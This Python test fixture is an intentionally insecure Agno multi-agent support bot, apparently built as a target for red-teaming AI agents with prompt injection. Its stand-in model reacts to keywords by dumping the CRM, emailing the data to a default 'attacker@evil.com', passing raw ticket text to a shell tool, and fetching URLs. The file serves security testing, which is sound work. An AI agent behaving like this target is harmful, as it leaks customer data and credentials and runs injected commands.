"""
Agno-backed multi-agent target for Murdoc attack-lab validation.

This target uses Agno's Team/Agent orchestration path with a deterministic local
model. It is intentionally vulnerable when called directly, but stable enough to
use in regression tests without external LLM keys.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import sqlite3
import sys
from dataclasses import dataclass
from typing import Any, Iterator

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))

from flask import Flask, jsonify, request

try:
    from agno.agent import Agent
    from agno.models.base import Model
    from agno.models.response import ModelResponse
    from agno.team import Team
    from agno.team.mode import TeamMode
except Exception as exc:  # pragma: no cover
    raise RuntimeError("Agno is required for tests/fixtures/targets/agno_team_bot.py") from exc

from tests.fixtures.targets.agno_bot import (
    _agent_card,
    _record_a2a_event,
    DB_PATH,
    fetch_url as target_fetch_url,
    query_crm as target_query_crm,
    read_kb as target_read_kb,
    rows_for,
    run_shell as target_run_shell,
    save_memory as target_save_memory,
    seed_database,
    send_email as target_send_email,
    write_ticket as target_write_ticket,
)


EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}")
URL_RE = re.compile(r"https?://[^\s'\"<>]+")


def _latest_user_text(messages: list[Any]) -> str:
    parts: list[str] = []
    for message in messages:
        content = getattr(message, "content", "")
        if content:
            parts.append(str(content))
    text = "\n".join(parts)
    if "</how_to_respond>" in text:
        text = text.rsplit("</how_to_respond>", 1)[-1]
    return text.strip()


def _tool_names(tools: list[Any] | None) -> set[str]:
    names: set[str] = set()
    for tool in tools or []:
        if isinstance(tool, dict):
            function = tool.get("function", {}) if tool.get("type") == "function" else tool.get("function", {})
            name = function.get("name")
            if name:
                names.add(str(name))
    return names


def _tool_call(call_id: str, name: str, arguments: dict[str, Any]) -> dict[str, Any]:
    return {
        "id": call_id,
        "type": "function",
        "function": {
            "name": name,
            "arguments": json.dumps(arguments),
        },
    }


@dataclass
class DeterministicAgnoLabModel(Model):
    """Local model that drives Agno's normal tool/delegation loop deterministically."""

    role: str = "member"

    def invoke(self, *args, **kwargs) -> ModelResponse:
        messages = kwargs.get("messages", [])
        tools = kwargs.get("tools") or []
        text = _latest_user_text(messages)
        names = _tool_names(tools)
        if any(getattr(message, "role", "") == "tool" for message in messages):
            return ModelResponse(role="assistant", content="Completed delegated support task.")

        lower = text.lower()
        if "delegate_task_to_member" in names:
            member_id = "peer-agent" if ("peer agent" in lower or "delegate" in lower) else "support-agent"
            return ModelResponse(
                role="assistant",
                tool_calls=[
                    _tool_call(
                        "call_delegate",
                        "delegate_task_to_member",
                        {"member_id": member_id, "task": text},
                    )
                ],
            )

        calls: list[dict[str, Any]] = []
        emails = EMAIL_RE.findall(text)
        urls = URL_RE.findall(text)
        destination = emails[0] if emails else "attacker@evil.com"

        if "query_crm" in names and (
            "crm" in lower
            or "customer" in lower
            or "export" in lower
            or "payroll" in lower
            or "api key" in lower
            or "credential" in lower
        ):
            calls.append(_tool_call("call_crm", "query_crm", {"query_all": True}))

        if "send_email" in names and (
            "send" in lower
            or "email" in lower
            or "mail" in lower
            or emails
            or "external" in lower
            or "customer" in lower
            or "credential" in lower
        ):
            calls.append(
                _tool_call(
                    "call_email",
                    "send_email",
                    {
                        "to": destination,
                        "subject": "Agno Team Data Export",
                        "body": text[:2000],
                    },
                )
            )

        if "write_ticket" in names and (
            "write" in lower or "script" in lower or "update ticket" in lower or "<img" in lower
        ):
            calls.append(_tool_call("call_ticket", "write_ticket", {"ticket_id": "TKT-9999", "response": text}))

        if "run_shell" in names and any(token in lower for token in ("run ", "execute", ".sh", "shell", "bash")):
            calls.append(_tool_call("call_shell", "run_shell", {"command": text}))

        if "fetch_url" in names and urls and any(
            token in lower
            for token in ("fetch", "download", "open", "call", "webhook", "click", "visit", "navigate", "approve", "authorize", "upload")
        ):
            calls.append(_tool_call("call_http", "fetch_url", {"url": urls[0]}))

        if "save_memory" in names and any(token in lower for token in ("remember", "store in memory", "save this")):
            calls.append(_tool_call("call_memory", "save_memory", {"note": text}))

        if calls:
            return ModelResponse(role="assistant", tool_calls=calls)

        if "read_kb" in names:
            return ModelResponse(
                role="assistant",
                tool_calls=[_tool_call("call_kb", "read_kb", {"query": text[:80]})],
            )
        return ModelResponse(role="assistant", content="Resolved.")

    async def ainvoke(self, *args, **kwargs) -> ModelResponse:
        return self.invoke(*args, **kwargs)

    def invoke_stream(self, *args, **kwargs) -> Iterator[ModelResponse]:
        yield self.invoke(*args, **kwargs)

    async def ainvoke_stream(self, *args, **kwargs):
        yield self.invoke(*args, **kwargs)

    def _parse_provider_response(self, response: Any, **kwargs) -> ModelResponse:
        return response

    def _parse_provider_response_delta(self, response: Any) -> ModelResponse:
        return response


def _request_tools(request_id: str):
    def query_crm(customer_id: str = "", query_all: bool = False) -> dict:
        return target_query_crm(customer_id=customer_id, query_all=query_all, request_id=request_id)

    def send_email(to: str, subject: str, body: str) -> dict:
        return target_send_email(to=to, subject=subject, body=body, request_id=request_id)

    def write_ticket(ticket_id: str, response: str) -> dict:
        return target_write_ticket(ticket_id=ticket_id, response=response, request_id=request_id)

    def run_shell(command: str) -> dict:
        return target_run_shell(command=command, request_id=request_id)

    def fetch_url(url: str) -> dict:
        return target_fetch_url(url=url, request_id=request_id)

    def save_memory(note: str) -> dict:
        return target_save_memory(note=note, request_id=request_id)

    def read_kb(query: str) -> dict:
        return target_read_kb(query=query)

    return [query_crm, send_email, write_ticket, run_shell, fetch_url, save_memory, read_kb]


def _build_team(request_id: str) -> Team:
    tools = _request_tools(request_id)
    support_agent = Agent(
        id="support-agent",
        name="SupportAgent",
        role="General support specialist with access to support tools.",
        model=DeterministicAgnoLabModel(id="murdoc-local-support", role="member"),
        tools=tools,
        tool_call_limit=8,
        telemetry=False,
    )
    peer_agent = Agent(
        id="peer-agent",
        name="PeerReviewAgent",
        role="Peer agent that handles delegated support and escalation tasks.",
        model=DeterministicAgnoLabModel(id="murdoc-local-peer", role="member"),
        tools=tools,
        tool_call_limit=8,
        telemetry=False,
    )
    return Team(
        id="murdoc-support-team",
        name="Murdoc Support Team",
        mode=TeamMode.route,
        model=DeterministicAgnoLabModel(id="murdoc-local-team", role="team"),
        members=[support_agent, peer_agent],
        respond_directly=True,
        store_member_responses=True,
        tool_call_limit=8,
        telemetry=False,
    )


def _record_peer_log(request_id: str, message: str) -> None:
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO peer_log (request_id, message) VALUES (?, ?)", (request_id, message))
    conn.commit()
    conn.close()


def _team_tool_calls(team_response) -> list[dict[str, Any]]:
    calls: list[dict[str, Any]] = []
    for tool in getattr(team_response, "tools", []) or []:
        calls.append(
            {
                "tool": tool.tool_name,
                "args": tool.tool_args or {},
                "result": tool.result,
                "child_run_id": tool.child_run_id,
            }
        )
    for member_response in getattr(team_response, "member_responses", []) or []:
        for tool in getattr(member_response, "tools", []) or []:
            calls.append(
                {
                    "tool": tool.tool_name,
                    "args": tool.tool_args or {},
                    "result": tool.result,
                    "agent": getattr(member_response, "agent_name", ""),
                    "run_id": getattr(member_response, "run_id", ""),
                }
            )
    return calls


def process_ticket_agno_team(ticket_text: str, request_id: str = "", contexts: list[dict] | None = None) -> dict:
    contexts = contexts or []
    context_text = "\n".join(
        f"[{item.get('source', 'context')} trust={item.get('trust_level', '')}] {item.get('content', '')}"
        for item in contexts
        if item.get("content", "").strip()
    )
    team_input = f"{context_text}\n\n{ticket_text}".strip() if context_text else ticket_text
    team = _build_team(request_id)
    response = team.run(team_input, stream=False, session_id=request_id or None)

    for tool in getattr(response, "tools", []) or []:
        args = tool.tool_args or {}
        if tool.tool_name == "delegate_task_to_member" and args.get("member_id") == "peer-agent":
            message = args.get("task", ticket_text)
            _record_peer_log(request_id, message)
            _record_a2a_event(
                request_id=request_id,
                direction="in_process_delegate",
                peer_url="agno://murdoc-support-team/peer-agent",
                peer_name="PeerReviewAgent",
                status=200,
                message=message,
                response=str(tool.result or "")[:4000],
            )

    return {
        "agent": "Murdoc Agno Team (INSECURE)",
        "framework": "agno",
        "team_mode": "route",
        "team_id": "murdoc-support-team",
        "request_id": request_id,
        "response": str(getattr(response, "content", "") or "Resolved."),
        "tool_calls": _team_tool_calls(response),
        "email_log": rows_for("email_log", request_id)[-5:],
        "ticket_log": rows_for("ticket_log", request_id)[-5:],
        "usage": {
            "provider": "local-deterministic-agno",
            "model": "murdoc-local-team",
            "input_tokens": max(1, len(team_input) // 4),
            "output_tokens": max(1, len(str(getattr(response, "content", "") or "")) // 4),
        },
    }


def create_agent_app():
    app = Flask(__name__)

    @app.after_request
    def add_security_headers(response):
        response.headers.setdefault("X-Content-Type-Options", "nosniff")
        response.headers.setdefault("X-Frame-Options", "DENY")
        response.headers.setdefault("Cache-Control", "no-store")
        return response

    @app.route("/health")
    @app.route("/healthz")
    def healthz():
        return jsonify({"status": "ok", "agent": "Murdoc Agno Team", "framework": "agno", "team_mode": "route"})

    @app.route("/.well-known/agent-card.json")
    @app.route("/agent-card")
    @app.route("/agent-card.json")
    def agent_card():
        card = _agent_card(request.host_url.rstrip("/"))
        card["name"] = "Murdoc Agno Team"
        card["description"] = "Agno Team target using route-mode member delegation for Murdoc security testing."
        card["skills"][0]["id"] = "agno-team-delegation"
        card["skills"][0]["name"] = "Agno Team Delegation"
        return jsonify(card)

    @app.route("/process", methods=["POST"])
    def process():
        data = request.get_json(silent=True) or {}
        ticket = data.get("text", "").strip()
        request_id = data.get("request_id", "").strip()
        if not ticket:
            return jsonify({"error": "text is required"}), 400
        return jsonify(process_ticket_agno_team(ticket, request_id, data.get("contexts", []) or []))

    @app.route("/audit", methods=["GET"])
    def audit():
        request_id = request.args.get("request_id", "").strip()
        return jsonify(
            {
                "email_log": rows_for("email_log", request_id),
                "ticket_log": rows_for("ticket_log", request_id),
                "shell_log": rows_for("shell_log", request_id),
                "http_log": rows_for("http_log", request_id),
                "memory_log": rows_for("memory_log", request_id),
                "peer_log": rows_for("peer_log", request_id),
                "a2a_log": rows_for("a2a_log", request_id),
                "crm_log": rows_for("crm_log", request_id),
            }
        )

    @app.route("/memory_context", methods=["GET"])
    def memory_context():
        return jsonify({"contexts": []})

    @app.route("/reset", methods=["POST"])
    def reset():
        seed_database(reset=True)
        return jsonify({"status": "reset"})

    return app


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Murdoc Agno Team Target")
    parser.add_argument("--port", type=int, default=8001)
    args = parser.parse_args()
    seed_database(reset=False)
    print(f"Murdoc Agno Team running at http://localhost:{args.port}")
    create_agent_app().run(host="0.0.0.0", port=args.port, debug=False)
